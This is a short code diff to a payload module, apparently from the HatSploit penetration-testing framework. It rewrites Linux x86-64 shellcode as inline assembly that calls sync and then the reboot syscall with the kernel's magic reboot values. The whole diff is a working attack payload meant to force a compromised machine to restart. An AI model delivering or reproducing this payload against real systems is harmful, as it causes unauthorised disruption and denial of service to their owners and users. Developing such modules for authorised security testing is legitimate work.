@@ -24,10 +24,17 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        return (
-            b"\xba\xdc\xfe\x21\x43"  # mov    $0x4321fedc,%edx
-            b"\xbe\x69\x19\x12\x28"  # mov    $0x28121969,%esi
-            b"\xbf\xad\xde\xe1\xfe"  # mov    $0xfee1dead,%edi
-            b"\xb0\xa9"              # mov    $0xa9,%al
-            b"\x0f\x05"              # syscall
+        return self.assemble(
+            self.details['Architecture'],
+            """
+            start:
+                mov rax, 0xa2
+                syscall
+
+                mov rax, 0xa9
+                mov rdx, 0x1234567
+                mov rsi, 0x28121969
+                mov rdi, 0xfee1dead
+                syscall
+            """
         )
